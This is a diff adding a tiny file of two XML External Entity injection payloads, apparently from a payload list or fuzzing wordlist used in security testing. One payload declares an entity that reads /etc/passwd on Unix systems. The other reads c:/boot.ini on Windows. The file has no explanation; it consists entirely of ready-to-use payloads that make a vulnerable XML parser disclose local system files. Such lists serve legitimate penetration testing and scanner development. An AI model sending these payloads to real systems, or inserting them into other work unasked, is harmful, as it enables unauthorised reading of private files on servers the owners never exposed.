@@ -1,0 +1,8 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+---
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY file SYSTEM "file:///c:/boot.ini">
+]>
+<data>&file;</data>
